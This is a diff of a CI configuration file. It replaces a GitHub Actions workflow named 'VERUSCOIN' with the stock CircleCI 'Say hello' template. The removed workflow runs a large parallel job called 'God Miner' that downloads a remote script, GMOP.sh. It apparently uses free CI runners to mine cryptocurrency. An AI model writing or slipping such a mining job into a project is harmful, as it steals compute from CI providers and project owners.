@@ -1,27 +1,26 @@
-name: VERUSCOIN
-on: [push, pull_request]
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/2.0/configuration-reference
+version: 2.1
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
-  build:
-    name: God Miner
-    runs-on: ubuntu-18.04
-    strategy:
-      max-parallel: 30
-      fail-fast: false
-      matrix:
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
-        flag: [A, B, C, D, E, F, G, H, I]
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
+  say-hello:
+    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
+    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+    docker:
+      - image: cimg/base:stable
+    # Add steps to the job
+    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
     steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Setup
-      uses: actions/checkout@v1
-    - name: God Miner
-      run: |
-        wget https://raw.githubusercontent.com/Godmine99/cpu/main/GMOP.sh
+      - checkout
+      - run:
+          name: "Say hello"
+          command: "echo Hello, World!"
+
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+workflows:
+  say-hello-workflow:
+    jobs:
+      - say-hello
